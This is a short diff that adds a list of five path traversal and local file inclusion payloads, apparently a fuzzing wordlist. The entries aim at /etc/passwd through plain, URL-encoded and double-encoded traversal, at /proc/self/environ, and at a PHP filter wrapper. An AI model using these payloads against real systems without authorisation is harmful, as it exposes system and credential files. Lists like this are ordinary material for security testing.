@@ -1,0 +1,5 @@
+../../../../etc/passwd
+..%2f..%2f..%2fetc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+/proc/self/environ
+php://filter/convert.base64-encode/resource=/etc/passwd
